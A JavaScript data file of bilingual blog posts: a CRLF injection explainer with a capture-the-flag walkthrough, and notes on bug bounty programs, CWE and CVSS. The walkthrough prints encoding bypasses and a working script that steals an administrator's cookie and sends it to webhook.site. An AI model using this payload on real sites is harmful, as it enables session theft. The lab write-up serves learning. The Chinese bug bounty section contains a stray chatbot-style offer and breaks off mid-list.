window.postsData = [
{
    id: "crlf-injection",
    href: "posts/web/crlf-injection.html",
    title: {
      "en": "CRLF Injection",
      "zh": "CRLF 注入"
    },
    category: "web",
    categoryLabel: {
      "en": "Web",
      "zh": "Web"
    },
    description: {
      "en": "CRLF injection basics, attack surfaces, bypass techniques, and a practical lab walkthrough.",
      "zh": "CRLF 注入基础、常见攻击面、绕过方式与一篇带截图的实战记录。"
    },
    date: "2026-04-24",
    content: {
      "en": "A full note covering the nature of CRLF injection, common abuse patterns, and a practical cookie exfiltration walkthrough.",
      "zh": "完整梳理 CRLF 注入的本质、常见利用方式，以及一次获取管理员 Cookie 的实战过程。"
    },
    code: "%0D%0A%0D%0A",
    contentHtml: {
      en: String.raw`<p>CRLF (Carriage Return + Line Feed) is a control-character pair used to represent line breaks in network protocols:</p>
<ul>
  <li><code>\r</code>: Carriage Return</li>
  <li><code>\n</code>: Line Feed</li>
</ul>
<p>In HTTP, CRLF has <strong>structural meaning</strong>. It is not just ordinary text; it is used to:</p>
<ul>
  <li>Separate one header from another</li>
  <li>Separate headers from the response body</li>
</ul>
<blockquote>CRLF controls the structure of an HTTP message, not its content.</blockquote>
<hr />
<h3>The Nature of CRLF Injection</h3>
<p>The essence of a CRLF injection vulnerability is that an attacker can insert newline characters into an HTTP message, break the original structure, and forge new protocol-level content.</p>
<p>In other words:</p>
<ul>
  <li>Normal input is treated as data</li>
  <li>Injected CRLF is treated as protocol syntax</li>
</ul>
<p>That is the core reason the vulnerability exists.</p>
<hr />
<h3>A Basic Model</h3>
<p>Assume the server has logic like this:</p>
<pre><code>Location: /search?q=user_input</code></pre>
<p>If the user supplies:</p>
<pre><code>test\r\nSet-Cookie: session=hacked</code></pre>
<p>The server response becomes:</p>
<pre><code>Location: /search?q=test
Set-Cookie: session=hacked</code></pre>
<p>What happened here is:</p>
<ul>
  <li>The value was originally just a parameter</li>
  <li>It was elevated into a new header</li>
</ul>
<p>This is a classic CRLF injection.</p>
<hr />
<h3>Conditions for the Vulnerability</h3>
<ol>
  <li>User input reaches the structure of an HTTP message, such as a header, status line, or response</li>
  <li><code>\r</code> and <code>\n</code> are not filtered or encoded</li>
  <li>The backend directly concatenates strings</li>
</ol>
<blockquote>User-controlled input is inserted directly into protocol structure.</blockquote>
<hr />
<h3>Common Attack Types</h3>
<h4>Header Injection</h4>
<p>An attacker inserts new headers, for example:</p>
<ul>
  <li>Set-Cookie</li>
  <li>Location</li>
  <li>Content-Type</li>
</ul>
<p>This can lead to:</p>
<ul>
  <li>Cookie injection</li>
  <li>Session hijacking</li>
  <li>Manipulated redirects</li>
</ul>
<h4>HTTP Response Splitting</h4>
<p>By inserting:</p>
<pre><code>\r\n\r\n</code></pre>
<p>The attacker forcefully ends the current response and starts a new one:</p>
<pre><code>Normal response
\r\n\r\n
Forged response</code></pre>
<p>This can be used to:</p>
<ul>
  <li>Inject HTML pages</li>
  <li>Build XSS chains</li>
  <li>Return malicious content</li>
</ul>
<h4>Web Cache Poisoning</h4>
<ul>
  <li>Modify cached content through CRLF injection</li>
  <li>Poison CDN or proxy caches</li>
  <li>Make other users visit a malicious page</li>
  <li>Achieve persistent impact</li>
</ul>
<h4>Request Smuggling (Advanced Abuse)</h4>
<p>CRLF can also act as a low-level primitive for:</p>
<ul>
  <li>Injecting extra requests</li>
  <li>Confusing frontend and backend parsers</li>
  <li>Manipulating request queues</li>
</ul>
<p>These attacks are often combined with:</p>
<ul>
  <li>Differences between HTTP/1.1 and HTTP/2</li>
  <li>Inconsistent frontend/backend parsing behavior</li>
</ul>
<hr />
<h3>Common Injection Points</h3>
<p>CRLF injection is not limited to a single sink. Common entry points include:</p>
<ul>
  <li>URL parameters (GET)</li>
  <li>POST parameters</li>
  <li>HTTP headers such as <code>Referer</code> or <code>User-Agent</code></li>
  <li>Redirect parameters such as <code>Location</code></li>
  <li>Logging systems (log injection)</li>
</ul>
<hr />
<h3>Encoding and Bypass</h3>
<p>In practice, many systems try to filter <code>\r\n</code>, so bypass techniques are often needed.</p>
<h4>URL Encoding</h4>
<pre><code>%0d%0a
%0a
%0d</code></pre>
<h4>Double Encoding</h4>
<pre><code>%250d%250a</code></pre>
<h4>Variant Techniques</h4>
<ul>
  <li>Using only LF when a system filters only CR</li>
  <li>Abusing parsing differences between layers</li>
  <li>Using special HTTP/2 header constructions</li>
</ul>
<hr />
<h3>Relationship with XSS and CSRF</h3>
<p>CRLF itself is not always the final exploit. It is more like a primitive.</p>
<p>It can be used as:</p>
<ul>
  <li>A trigger for XSS by injecting HTML or JavaScript</li>
  <li>Support for CSRF by influencing headers or cookies</li>
  <li>A foundation for request smuggling</li>
</ul>
<blockquote>CRLF is control at the protocol layer, while XSS is control at the browser execution layer.</blockquote>
<hr />
<h3>Attack-Chain Perspective</h3>
<p>A full attack chain often looks like this:</p>
<pre><code>CRLF injection
→ Control HTTP structure
→ Insert malicious headers or response content
→ Trigger cache, browser, or backend behavior
→ Reach the final impact (XSS, privilege escalation, data exposure)</code></pre>
<hr />
<h3>Practical Walkthrough</h3>
<p>This was a site that allowed online reports. Clicking <code>REPORT</code> opened the report page. The objective was to obtain the administrator's cookie, which contained the flag.</p>
<img src="assets/posts/crlf-injection/Pasted image 20260423235305.png" alt="Target application landing page" />
<img src="assets/posts/crlf-injection/Pasted image 20260423220226.png" alt="Report page" />
<p>Enter some arbitrary content and then intercept the request with Burp Suite.</p>
<img class="post-image-small" src="assets/posts/crlf-injection/Pasted image 20260423220515.png" alt="Burp Suite intercepted request" />
<p>The page only returned <code>reported</code>, without anything particularly interesting.</p>
<img src="assets/posts/crlf-injection/Pasted image 20260423235353.png" alt="Reported response page" />
<p>First, use CRLF injection in the <code>name</code> field to split the response with the following payload:</p>
<pre><code>%0D%0A%0D%0A</code></pre>
<p>This is equivalent to <code>\r\n\r\n</code>, and it does the following:</p>
<ul>
  <li>Ends the current header line</li>
  <li>Creates an additional blank line</li>
  <li>Forcefully terminates the response headers</li>
  <li>Pushes attacker-controlled content into the response body</li>
  <li>Makes the browser render subsequent content as HTML</li>
  <li>Allows the script inside <code>iframe srcdoc</code> to execute</li>
  <li>Triggers a request to the webhook after the script runs</li>
</ul>
<p>Next, use the following content in the <code>content</code> field:</p>
<pre><code class="language-html">&lt;iframe srcdoc="&lt;script&gt;
let t = top.document.body.innerText || '';

let m = t.match(/Set-Cookie: flag=([^;\n]+)/);

(new Image()).src = 'https://webhook.site/?raw=' +
    encodeURIComponent(m[1]) +
    '&amp;dec=' +
    encodeURIComponent(atob(m[1]));
&lt;/script&gt;"&gt;&lt;/iframe&gt;</code></pre>
<p>Because the response headers were terminated early through the <code>name</code> field, and that field was reflected into the header section on the target server, we could recover the cookie by matching it from the rendered page.</p>
<p>The payload can then be shortened into a single line:</p>
<pre><code class="language-js">&lt;iframe srcdoc="&amp;lt;script&amp;gt;let t=top.document.body.innerText||'';let m=t.match(/Set-Cookie: flag=([^;\n]+)/);(new Image()).src='https://webhook.site/?raw='+encodeURIComponent(m[1])+'&amp;dec='+encodeURIComponent(atob(m[1]));&amp;lt;/script&amp;gt;"&gt;&lt;/iframe&gt;</code></pre>
<p>Finally, URL-encode the key characters:</p>
<pre><code>&lt;iframe+srcdoc%3d"%26lt%3bscript%26gt%3blet+t%3dtop.document.body.innerText||''%3blet+m%3dt.match(/Set-Cookie%3a+flag%3d([^%3b\n]%2b)/)%3b(new+Image()).src%3d'https%3a//webhook.site/%3fraw%3d'%2bencodeURIComponent(m[1])%2b'%26dec%3d'%2bencodeURIComponent(atob(m[1]))%3b%26lt%3b/script%26gt%3b"&gt;&lt;/iframe&gt;</code></pre>
<img src="assets/posts/crlf-injection/Pasted image 20260423235453.png" alt="Final encoded payload" />
<p>The webhook then successfully received the request.</p>
<img src="assets/posts/crlf-injection/Pasted image 20260423235547.png" alt="Webhook request containing the flag" />`,
      zh: String.raw`<p>CRLF（Carriage Return + Line Feed）是一种在网络协议中用于表示换行的控制字符组合：</p>
<ul>
  <li><code>\r</code>：回车（Carriage Return）</li>
  <li><code>\n</code>：换行（Line Feed）</li>
</ul>
<p>在 HTTP 协议中，CRLF 具有<strong>结构性意义</strong>，它不是普通字符，而是用于：</p>
<ul>
  <li>分隔 Header 与 Header</li>
  <li>分隔 Header 与 Body</li>
</ul>
<blockquote>CRLF 控制的是 HTTP 报文的“结构”，而不是“内容”。</blockquote>
<hr />
<h3>CRLF 注入的本质</h3>
<p>CRLF 注入漏洞的本质是：攻击者可以向 HTTP 报文中插入换行符，从而“打断原有结构”，并“伪造新的协议内容”。</p>
<p>换句话说：</p>
<ul>
  <li>正常输入：被当成数据</li>
  <li>注入 CRLF：被当成协议</li>
</ul>
<p>这就是漏洞成立的核心。</p>
<hr />
<h3>一个基础模型</h3>
<p>假设服务器有如下逻辑：</p>
<pre><code>Location: /search?q=用户输入</code></pre>
<p>如果用户输入：</p>
<pre><code>test\r\nSet-Cookie: session=hacked</code></pre>
<p>服务器响应变成：</p>
<pre><code>Location: /search?q=test
Set-Cookie: session=hacked</code></pre>
<p>这里发生的事情是：</p>
<ul>
  <li>原本只是参数</li>
  <li>被提升为新的 Header</li>
</ul>
<p>这就是典型的 CRLF 注入。</p>
<hr />
<h3>漏洞形成条件</h3>
<ol>
  <li>用户输入进入 HTTP 报文结构中（Header / 状态行 / 响应）</li>
  <li>没有对 <code>\r</code> 和 <code>\n</code> 进行过滤或编码</li>
  <li>后端直接拼接字符串</li>
</ol>
<blockquote>用户输入被“直接拼进协议结构”。</blockquote>
<hr />
<h3>常见攻击类型</h3>
<h4>Header 注入</h4>
<p>攻击者插入新的 Header，例如：</p>
<ul>
  <li>Set-Cookie</li>
  <li>Location</li>
  <li>Content-Type</li>
</ul>
<p>效果包括：</p>
<ul>
  <li>注入 Cookie</li>
  <li>劫持会话</li>
  <li>控制重定向行为</li>
</ul>
<h4>HTTP 响应拆分</h4>
<p>通过插入如下内容：</p>
<pre><code>\r\n\r\n</code></pre>
<p>强行结束当前响应，开始一个新的响应：</p>
<pre><code>正常响应
\r\n\r\n
伪造响应</code></pre>
<p>攻击者可以：</p>
<ul>
  <li>注入 HTML 页面</li>
  <li>构造 XSS</li>
  <li>返回恶意内容</li>
</ul>
<h4>Web 缓存投毒</h4>
<ul>
  <li>利用 CRLF 注入修改缓存内容</li>
  <li>污染 CDN 或代理缓存</li>
  <li>让其他用户访问恶意页面</li>
  <li>实现持久攻击</li>
</ul>
<h4>请求走私（高阶利用）</h4>
<p>CRLF 可以作为基础构造：</p>
<ul>
  <li>插入额外请求</li>
  <li>干扰前后端解析</li>
  <li>操控请求队列</li>
</ul>
<p>这类攻击通常结合：</p>
<ul>
  <li>HTTP/1.1 与 HTTP/2 差异</li>
  <li>Front-end / Back-end 不一致解析</li>
</ul>
<hr />
<h3>常见注入位置</h3>
<p>CRLF 注入并不局限于某一个点，常见入口包括：</p>
<ul>
  <li>URL 参数（GET）</li>
  <li>POST 参数</li>
  <li>HTTP Header（如 Referer / User-Agent）</li>
  <li>重定向参数（Location）</li>
  <li>日志系统（Log Injection）</li>
</ul>
<hr />
<h3>编码与绕过</h3>
<p>现实中，很多系统会过滤 <code>\r\n</code>，因此需要绕过。常见方式包括：</p>
<h4>URL 编码绕过</h4>
<pre><code>%0d%0a
%0a
%0d</code></pre>
<h4>双重编码</h4>
<pre><code>%250d%250a</code></pre>
<h4>变体利用</h4>
<ul>
  <li>只使用 LF（部分系统只过滤 CR）</li>
  <li>利用解析差异（前后端不同处理）</li>
  <li>HTTP/2 特殊 header 构造</li>
</ul>
<hr />
<h3>与 XSS / CSRF 的关系</h3>
<p>CRLF 本身不是最终攻击，而是一个“原语”。</p>
<p>它可以作为：</p>
<ul>
  <li>XSS 的触发器（注入 HTML / JS）</li>
  <li>CSRF 的辅助（控制 Header / Cookie）</li>
  <li>Smuggling 的基础</li>
</ul>
<blockquote>CRLF 是“协议层控制”，XSS 是“浏览器执行层控制”。</blockquote>
<hr />
<h3>攻击链视角</h3>
<p>完整攻击链通常是：</p>
<pre><code>CRLF 注入
→ 控制 HTTP 结构
→ 插入恶意 Header / Response
→ 触发缓存 / 浏览器 / 后端逻辑
→ 实现最终利用（XSS / 权限提升 / 数据泄露）</code></pre>
<hr />
<h3>实战表现</h3>
<p>这是一个可以在线举报的网站，点击 <code>REPORT</code> 会进入 report 页面。我们的目标是获得管理员的 Cookie，其中藏着 flag。</p>
<img src="assets/posts/crlf-injection/Pasted image 20260423235305.png" alt="CRLF 注入靶场首页" />
<img src="assets/posts/crlf-injection/Pasted image 20260423220226.png" alt="进入 report 页面后的界面" />
<p>随便输入一些内容，然后使用 Burp Suite 拦截请求。</p>
<img class="post-image-small" src="assets/posts/crlf-injection/Pasted image 20260423220515.png" alt="Burp Suite 拦截到的请求" />
<p>页面只返回 <code>reported</code>，没有特别的内容。</p>
<img src="assets/posts/crlf-injection/Pasted image 20260423235353.png" alt="reported 响应页面" />
<p>首先，在 <code>name</code> 中利用 CRLF 注入进行分割，内容如下：</p>
<pre><code>%0D%0A%0D%0A</code></pre>
<p>它等价于 <code>\r\n\r\n</code>，作用是：</p>
<ul>
  <li>结束当前 header 行</li>
  <li>再制造一个空行</li>
  <li>强行结束响应头</li>
  <li>让后续可控内容进入 response body</li>
  <li>让浏览器把后续内容当作 HTML 渲染</li>
  <li>使 <code>iframe srcdoc</code> 里的脚本能够执行</li>
  <li>脚本执行后再请求 webhook</li>
</ul>
<p>其次是 <code>content</code> 中的内容：</p>
<pre><code class="language-html">&lt;iframe srcdoc="&lt;script&gt;
let t = top.document.body.innerText || '';

let m = t.match(/Set-Cookie: flag=([^;\n]+)/);

(new Image()).src = 'https://webhook.site/?raw=' +
    encodeURIComponent(m[1]) +
    '&amp;dec=' +
    encodeURIComponent(atob(m[1]));
&lt;/script&gt;"&gt;&lt;/iframe&gt;</code></pre>
<p>因为之前在 <code>name</code> 中提前结束了响应头，在目标服务器那边，<code>name</code> 被放进了 header 部分，所以我们可以利用匹配的方式来获取 Cookie。</p>
<p>将代码缩短为一行：</p>
<pre><code class="language-js">&lt;iframe srcdoc="&amp;lt;script&amp;gt;let t=top.document.body.innerText||'';let m=t.match(/Set-Cookie: flag=([^;\n]+)/);(new Image()).src='https://webhook.site/?raw='+encodeURIComponent(m[1])+'&amp;dec='+encodeURIComponent(atob(m[1]));&amp;lt;/script&amp;gt;"&gt;&lt;/iframe&gt;</code></pre>
<p>再将关键字进行 URL 编码：</p>
<pre><code>&lt;iframe+srcdoc%3d"%26lt%3bscript%26gt%3blet+t%3dtop.document.body.innerText||''%3blet+m%3dt.match(/Set-Cookie%3a+flag%3d([^%3b\n]%2b)/)%3b(new+Image()).src%3d'https%3a//webhook.site/%3fraw%3d'%2bencodeURIComponent(m[1])%2b'%26dec%3d'%2bencodeURIComponent(atob(m[1]))%3b%26lt%3b/script%26gt%3b"&gt;&lt;/iframe&gt;</code></pre>
<img src="assets/posts/crlf-injection/Pasted image 20260423235453.png" alt="编码后的最终 payload" />
<p>在 Webhook 成功收到请求。</p>
<img src="assets/posts/crlf-injection/Pasted image 20260423235547.png" alt="Webhook 收到带有 flag 的请求" />`
    }
  },
{
    id: "bug-bounty-programs",
    href: "posts/pentest/bug-bounty-programs.html",
    title: {
      "en": "Bug Bounty Programs: Rules, Scope, and Report Writing",
      "zh": "漏洞赏金计划：规则、范围与报告写作"
    },
    category: "pentest",
    categoryLabel: {
      "en": "Penetration Testing",
      "zh": "渗透测试"
    },
    description: {
      "en": "A structured learning note about bug bounty program models, policy scope, report quality, CWE, and CVSS.",
      "zh": "系统梳理漏洞赏金计划类型、行为准则、项目结构、报告写作、CWE 与 CVSS。"
    },
    date: "2026-05-07",
    content: {
      "en": "A structured learning note about bug bounty program models, policy scope, report quality, CWE, and CVSS.",
      "zh": "系统梳理漏洞赏金计划类型、行为准则、项目结构、报告写作、CWE 与 CVSS。"
    },
    code: "CWE + CVSS + clear reproduction steps",
    contentHtml: {
      en: String.raw`<h2>Theory</h2>
<h3>Bug Bounty Programs</h3>
<p>A bug bounty program is a crowdsourced security testing mechanism where independent researchers discover and responsibly report vulnerabilities. A mature program is not just a reward channel; it is a continuous vulnerability-management process that complements internal code review, penetration testing, and secure development work.</p>
<blockquote>Continuous testing turns security review from a one-time activity into an ongoing feedback loop.</blockquote>
<hr />
<h3>Bug Bounty Program Types</h3>
<ul><li><strong>Private programs:</strong> invitation-only programs used when an organization wants to control report volume and mature its triage process.</li><li><strong>Public programs:</strong> open programs that allow a larger researcher community to test approved assets.</li><li><strong>Parent/child programs:</strong> related programs where a parent company and subsidiaries share a security team or reward pool.</li><li><strong>VDP:</strong> a vulnerability disclosure program that tells researchers how to report issues, often without payment.</li><li><strong>BBP:</strong> a bug bounty program that defines testing scope, rules, and monetary incentives.</li></ul>
<hr />
<h3>Bug Bounty Program Code of Conduct</h3>
<p>Researchers are judged not only by technical ability but also by professionalism. Carefully reading and following the code of conduct prevents accidental out-of-scope testing, unsafe impact, duplicate disputes, and unnecessary friction with the triage team.</p>
<hr />
<h3>Bug Bounty Program Structure</h3>
<p>A typical policy explains in-scope assets, out-of-scope issues, response SLAs, testing accounts, report requirements, reward rules, safe-harbor language, legal terms, and contact information. Reading the policy before testing is part of the methodology.</p>
<hr />
<h3>Finding Bug Bounty Programs</h3>
<p>Directories such as HackerOne Directory help researchers discover programs and find responsible disclosure contacts. They are useful both for active bounty hunting and for reporting vulnerabilities found during normal research.</p>
<hr />
<h2>Writing a Good Report</h2>
<p>A good vulnerability report is clear, concise, reproducible, and impact-focused. The triage team should be able to understand the issue, reproduce it step by step, and evaluate realistic business risk.</p>
<h3>What a Good Report Should Include</h3>
<ul><li><strong>Title:</strong> vulnerability type, affected asset, and impact.</li><li><strong>CWE:</strong> standardized weakness category.</li><li><strong>CVSS:</strong> severity expressed through a repeatable scoring model.</li><li><strong>Description:</strong> why the vulnerability exists.</li><li><strong>Proof of Concept:</strong> reproducible steps, requests, screenshots, or payloads.</li><li><strong>Impact:</strong> what an attacker can actually do after successful exploitation.</li><li><strong>Remediation:</strong> practical fix guidance when useful.</li></ul>
<h3>Why CWE and CVSS Matter</h3>
<p>CWE answers “what kind of weakness is this?” CVSS answers “how severe is it?” For vulnerability chains, choose the CWE that represents the initial weakness rather than only the final effect.</p>
<h3>CVSS Base Metrics</h3>
<ul><li>Attack Vector</li><li>Attack Complexity</li><li>Privileges Required</li><li>User Interaction</li><li>Scope</li><li>Confidentiality Impact</li><li>Integrity Impact</li><li>Availability Impact</li></ul>
<h3>Examples</h3>
<p>A remote unauthenticated buffer overflow that leads to shell access is likely critical. An admin-only stored XSS may be medium if it requires high privileges and has limited impact. The vulnerability name alone does not determine severity.</p>`,
      zh: String.raw`<h2>理论</h2>
<h3>漏洞赏金计划</h3>
<p>正如本模块总结中提到的，漏洞赏金计划通常被视为一种众包式安全机制：个人通过发现并报告软件漏洞，获得认可与报酬。</p>
<p>不过，漏洞赏金计划的意义远不止“找漏洞拿奖金”这么简单。漏洞赏金计划（Bug Bounty Program），也常被称为漏洞奖励计划（Vulnerability Rewards Program, VRP），本质上是一种<strong>持续、主动</strong>的安全测试机制。它用于补充企业内部的代码审计和渗透测试，并进一步完善组织整体的漏洞管理策略。也就是说，它不是一次性的安全检查，而是把外部研究人员的持续测试纳入企业长期安全体系中。</p>
<p>对其漏洞赏金平台的描述很贴切：<strong>“持续测试，持续防护（Continuous testing, constant protection）”</strong>。这说明漏洞赏金并不是开发结束后的附加项目，而是可以无缝融入企业现有软件开发生命周期中的安全环节。换句话说，它让安全测试从阶段性行为，变成一种长期运行的机制。</p>
<hr />
<h3>漏洞赏金计划类型</h3>
<p>漏洞赏金计划主要可以分为<strong>私有计划</strong>和<strong>公开计划</strong>两类。</p>
<p>私有漏洞赏金计划不会向公众开放。研究人员只有在收到特定邀请后，才能参与这类项目。大多数漏洞赏金计划最初都会以私有形式启动，因为这样企业可以先逐步适应接收漏洞报告、进行分类和处理的流程，等机制成熟后再开放给更广泛的安全社区。通常，研究人员能否获得私有项目邀请，与其过往成绩、有效漏洞提交的稳定性以及是否有违规记录密切相关。像 HackerOne 这样的平台，就会根据一系列标准发出邀请。有些项目甚至还会要求参与者通过背景调查。</p>
<p>公开漏洞赏金计划则面向整个黑客社区开放，任何符合条件的研究人员都可以参与测试和报告漏洞。这种模式覆盖面更广，能够借助更多外部研究者的力量发现问题，但对企业的处理能力要求也更高。</p>
<p>除此之外，还有一种<strong>母子计划（Parent/Child Programs）</strong>。这种模式下，母公司和其子公司会共享同一个奖金池以及同一个网络安全团队。若某个子公司启动了自己的漏洞赏金项目，该项目会与母项目关联起来。这个设计便于集团化公司统一管理漏洞处理和奖励发放。</p>
<p>这里还有一个很重要的概念区分：<strong>Bug Bounty Program（BBP）</strong> 和 <strong>Vulnerability Disclosure Program（VDP）</strong> 不能混用。 漏洞披露计划（VDP）只是告诉外部人员：如果你发现了漏洞，应该如何向该组织提交信息。它本身不一定提供奖金。 而漏洞赏金计划（BBP）则更进一步：它不仅鼓励第三方主动去发现并上报漏洞，还会以金钱奖励作为激励。简单说，<strong>VDP 解决“怎么报”，BBP 解决“报了有什么激励”</strong>。两者有联系，但不是一回事。</p>
<hr />
<h3>漏洞赏金计划行为准则</h3>
<p>漏洞赏金猎人的违规记录会一直被重点考虑，因此，严格遵守每个漏洞赏金项目或平台的行为准则（Code of Conduct）是非常关键的。这不是走形式，也不是“顺手瞄一眼就行”的东西。恰恰相反，花时间认真阅读这些规则，会直接影响你能不能高效、安全、专业地提交报告。</p>
<p>行为准则不仅规定了参与者应该如何行动，也会帮助研究人员更清楚地理解项目方的期望，从而减少误解、避免踩线，并提升漏洞报告的质量。很多新手容易只盯着技术细节，忽视项目规则，结果漏洞没问题，流程上却翻车，这就很亏。</p>
<p>如果想成为成熟、长期可持续的漏洞赏金猎人，就必须在<strong>专业性</strong>和<strong>技术能力</strong>之间取得平衡。不是只会挖洞就够了，也不是只会写礼貌邮件就行，二者缺一不可。文中也建议读者去查看 HackerOne 的行为准则，以熟悉这类文档的写法和要求。这个建议很实际，因为很多平台的规则虽然措辞不同，但底层逻辑都差不多：别乱搞，别越界，按规范来。</p>
<hr />
<h3>漏洞赏金计划结构</h3>
<p>接下来，文章开始说明一个漏洞赏金计划通常长什么样。它建议读者去 HackerOne 的项目列表中查看具体实例，比如 Alibaba BBP 和 Amazon Vulnerability Research Program，并重点阅读其中的 <strong>Policy</strong> 部分。</p>
<p>按照 HackerOne 的说法，Policy 部分是组织用来向黑客说明项目细节的地方。企业通常会在这里发布漏洞披露政策，告诉研究人员：他们希望怎样接收漏洞信息、哪些产品或服务允许测试、哪些内容属于测试范围。通常，这些范围会通过域名、IP 范围、Web 应用，或者特定的 App Store / Play Store 应用来界定。</p>
<p>一个典型的漏洞赏金计划通常会包含以下要素： 它会说明厂商响应的 SLA，也就是厂商会在什么时间、以什么方式回应报告；会说明研究测试所需的访问方式，比如如何创建测试账号；会规定资格标准，例如“必须是第一个提交该漏洞的人”才能拿到奖励；会提供负责任披露政策，用来约定公开时间线和协调流程，以保障用户安全；还会定义参与规则（Rules of Engagement）、测试范围（Scope）、范围外内容（Out of Scope）、报告格式（Reporting Format）、奖励机制（Rewards）、安全港条款（Safe Harbor）、法律条款（Legal Terms and Conditions）以及联系信息（Contact Information）。</p>
<p>在 HackerOne 上，这些内容通常都包含在每个项目的 Policy 部分里。这里的重点很明确：<strong>一定要仔细看项目说明和政策，不要想当然。</strong> 很多来回扯皮、时间浪费，根本不是因为技术不会，而是因为一开始没把规则看清楚。漏洞赏金里，时间确实很重要，谁先提交、谁提交得更规范，都会影响结果。这个领域有点像打怪抢首杀，但规则比副本机制还烦，不读清楚就容易白忙活。</p>
<hr />
<h3>寻找漏洞赏金项目</h3>
<p>在寻找合适的漏洞赏金项目方面，文中推荐的一个优秀在线资源是 <strong>HackerOne Directory</strong>。这个目录可以帮助研究人员找到自己感兴趣的漏洞赏金计划，也可以用来查找某些组织的漏洞报告联系方式，以便你在合规、道德的前提下报告自己发现的问题。</p>
<p>也就是说，这个目录不仅适合想“主动找项目做”的人，也适合那些在日常研究中偶然发现某组织漏洞、希望合法上报的人。它既是项目入口，也是负责任披露的一个信息来源。</p>
<hr />
<h3>总结</h3>
<p>这部分内容的核心意思可以概括为：漏洞赏金计划并不只是“发现漏洞换奖金”的简单机制，而是企业持续安全治理体系中的一个重要组成部分。它可以分为私有和公开两类，有时还存在母子项目结构。与此同时，BBP 和 VDP 必须明确区分，前者带有奖励激励，后者主要是披露通道。</p>
<p>对于参与者来说，真正重要的不只是技术水平，还包括是否理解并遵守项目规则。行为准则、范围、报告要求、法律条款这些内容看起来不刺激，但往往决定你能不能顺利、长期地做下去。最后，像 HackerOne Directory 这样的平台目录，是寻找项目和合法报告入口的重要资源。</p>
<p>如果你要，我下一步可以把这段内容继续整理成<strong>更像考试笔记的版本</strong>，也就是更短、更好背的那种 Markdown。</p>
<h2>如何写好漏洞报告</h2>
<p>这一部分主要讲的是：<strong>一份好的漏洞报告该怎么写，以及为什么要用 CWE 和 CVSS 来描述漏洞。</strong></p>
<p>好的漏洞报告首先要做到<strong>清晰、简洁、可复现</strong>。也就是说，报告不能只是说“这里有漏洞”，而是要让安全团队或分诊团队能够迅速看懂问题、理解影响，并且按照你提供的步骤一步一步复现漏洞。尤其重要的是，报告中必须清楚写出漏洞利用的复现过程，否则哪怕你真的找到高价值漏洞，对方也可能因为无法复现而延迟处理，甚至直接降低优先级。</p>
<p>文中还特别提到，如果你面对的是安全成熟度较低的公司，不能只堆技术术语。你需要把技术问题翻译成更容易理解的业务语言，让对方明白这个漏洞到底会带来什么现实风险。因为很多时候，真正推动修复的不是“这是个 XX 漏洞”，而是“这个漏洞会导致客户数据泄露、后台被接管、业务中断”。</p>
<hr />
<h3>好的漏洞报告应包含什么</h3>
<p>一份高质量的漏洞报告通常包含以下核心元素，不过这些元素的顺序不一定固定。</p>
<p>首先是<strong>漏洞标题</strong>。标题要尽量明确，最好直接体现出漏洞类型、受影响的位置以及影响。例如受影响的域名、参数、接口或功能点。标题不是装饰品，而是别人第一眼判断问题性质的入口。</p>
<p>然后是 <strong>CWE 和 CVSS 分数</strong>。CWE 用来说明这属于哪一类安全弱点，CVSS 用来量化漏洞严重程度。它们的价值在于让漏洞特征和风险等级能够用标准化方式表达，而不是只靠主观描述。</p>
<p>接着是<strong>漏洞描述</strong>。这一部分的重点是说明漏洞为什么会存在，也就是帮助对方理解根因，而不只是现象。</p>
<p>之后是<strong>POC（概念验证 / 复现步骤）</strong>。这是报告中最关键的部分之一，需要清楚、简洁、可重复。别人照着你的步骤操作，应该能稳定看到漏洞效果。写得像谜语人一样，那就很容易把事情搞成技术相声。</p>
<p>然后是<strong>影响分析</strong>。这里不只是简单写“可能有风险”，而是要说明攻击者在完全利用该漏洞后，究竟能做到什么，造成什么业务后果，最大损害是什么。好的影响描述通常既包含技术影响，也包含业务影响。</p>
<p>最后是<strong>修复建议</strong>。文中说这在漏洞赏金项目里是可选项，不一定强制要求，但如果你能提供合理的修复建议，整体报告质量会更高，也更容易体现专业性。</p>
<p>总体来说，<strong>可读性强、格式清晰的报告能大幅减少复现时间和分诊时间</strong>。这很关键，因为漏洞赏金场景里，时间就是货币，报告越容易处理，你越容易被高效确认。</p>
<hr />
<h3>为什么要使用 CWE 与 CVSS</h3>
<p>这一部分解释了：为什么漏洞报告里经常要写 CWE 和 CVSS。</p>
<h4>是什么</h4>
<p>CWE，全称 <strong>Common Weakness Enumeration</strong>，即<strong>通用弱点枚举</strong>。MITRE 把它定义为一个社区共同维护的软件和硬件弱点类型列表。它相当于一种统一语言，用于描述漏洞背后的弱点本质，比如输入验证不当、访问控制缺失、命令注入之类。</p>
<p>它的作用有几个： 一是方便大家统一交流，不同公司、平台、研究人员都能用同样的标签理解问题； 二是作为安全工具的参考标准； 三是帮助进行漏洞识别、缓解和预防。</p>
<p>文中还提醒：如果你面对的是<strong>漏洞链</strong>，那应该优先选择与<strong>初始漏洞</strong>相关的 CWE，而不是选后续效果对应的那个。这个点很细，但很实用。</p>
<h4>是什么</h4>
<p>CVSS，全称 <strong>Common Vulnerability Scoring System</strong>，即<strong>通用漏洞评分系统</strong>。它是全世界很多组织都在使用的标准，用来衡量漏洞严重程度。</p>
<p>简单说，CWE 更像是在回答： <strong>“这是什么类型的问题？”</strong></p>
<p>而 CVSS 更像是在回答： <strong>“这个问题有多严重？”</strong></p>
<p>所以这两个东西经常一起出现，一个负责分类，一个负责定级。</p>
<hr />
<h3>使用 CVSS 计算器</h3>
<p>这一部分开始讲 <strong>CVSS v3.1 计算器</strong> 怎么用，并说明在这里主要关注 <strong>Base Score（基础分）</strong>。</p>
<p>的各个维度，本质上是在评估：漏洞是怎么被利用的、利用难不难、需要什么权限、影响大不大。</p>
<h4>1. Attack Vector（攻击向量）</h4>
<p>这个指标表示攻击者通过什么方式来利用漏洞。</p>
<ul><li><strong>Network (N)</strong>：通过网络远程利用。</li></ul>
<ul><li><strong>Adjacent (A)</strong>：必须与目标处于同一物理或逻辑网络中，例如同一局域网或同一 VPN。</li></ul>
<ul><li><strong>Local (L)</strong>：必须本地访问目标系统，或者通过 SSH 这类方式登录后利用。</li></ul>
<ul><li><strong>Physical (P)</strong>：需要物理接触设备。</li></ul>
<p>题目里问的那个答案就是这里的 <strong>Adjacent (A)</strong>。</p>
<h4>2. Attack Complexity（攻击复杂度）</h4>
<p>表示成功利用漏洞前，是否还需要满足额外条件。</p>
<ul><li><strong>Low (L)</strong>：基本不需要额外准备，攻击者可以比较直接地反复利用。</li></ul>
<ul><li><strong>High (H)</strong>：需要特殊准备、额外条件或更多信息收集。</li></ul>
<h4>3. Privileges Required（所需权限）</h4>
